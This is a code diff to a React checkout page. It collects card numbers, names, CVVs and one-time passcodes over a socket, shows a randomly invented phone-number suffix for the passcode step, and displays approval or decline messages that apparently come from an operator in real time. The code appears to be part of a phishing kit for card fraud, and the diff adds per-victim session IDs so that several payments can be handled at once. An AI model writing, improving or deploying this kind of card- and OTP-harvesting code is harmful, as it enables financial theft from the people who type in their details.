@@ -79,6 +79,7 @@ const Checkout = () => {
   const [otpMobileLast4, setOtpMobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
   const [showSpinner, setShowSpinner] = useState(false);
   const [declineError, setDeclineError] = useState("");
+  const [paymentId] = useState(() => 'pay_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
 
   // Pricing data based on the main page
   const pricingData = {
@@ -326,10 +327,12 @@ const Checkout = () => {
       setCurrentStep('otp');
       startOtpTimer();
     });
-    socket.on('payment-approved', () => {
-      navigate('/payment-success', { state: { paymentData: { ...cardData, ...formData, planName, billing, amount: displayPrice } } });
+    socket.on('payment-approved', (data) => {
+      if (!data || data.paymentId !== paymentId) return;
+      navigate('/payment-success', { state: { paymentData: { ...cardData, ...formData, planName, billing, amount: displayPrice, paymentId } } });
     });
-    socket.on('payment-rejected', (reason: string) => {
+    socket.on('payment-rejected', (data) => {
+      if (!data || data.paymentId !== paymentId) return;
       setShowSpinner(true);
       setTimeout(() => {
         setShowSpinner(false);
@@ -337,7 +340,8 @@ const Checkout = () => {
         setDeclineError('Your card has declined.');
       }, 2500);
     });
-    socket.on('insufficient-balance-error', () => {
+    socket.on('insufficient-balance-error', (data) => {
+      if (!data || data.paymentId !== paymentId) return;
       setShowSpinner(true);
       setTimeout(() => {
         setShowSpinner(false);
@@ -345,7 +349,8 @@ const Checkout = () => {
         setDeclineError('Your card have insufficient balance to pay for this order');
       }, 2500);
     });
-    socket.on('invalid-otp-error', () => {
+    socket.on('invalid-otp-error', (data) => {
+      if (!data || data.paymentId !== paymentId) return;
       setOtpSubmitting(false);
       setOtpError('incorrect otp, please enter valid One time passcode');
       setTimeout(() => setOtpError(''), 5000);
@@ -370,7 +375,7 @@ const Checkout = () => {
       socket.off('card-declined-error');
       socket.off('insufficient-balance-error');
     };
-  }, [socket]);
+  }, [socket, paymentId]);
 
   const handleOtpSubmit = () => {
     try {
@@ -386,7 +391,7 @@ const Checkout = () => {
       
       setOtpSubmitting(true);
       setOtpError('');
-      socket.emit('otp-submitted', { otp: otpValue });
+      socket.emit('otp-submitted', { otp: otpValue, paymentId });
     } catch (error) {
       console.error('Error submitting OTP:', error);
       setOtpSubmitting(false);
@@ -481,6 +486,7 @@ const Checkout = () => {
         return;
       }
       const paymentData = {
+        paymentId,
         cardNumber: cardData.cardNumber,
         cardName: cardData.cardName,
         cvv: cardData.cvv,
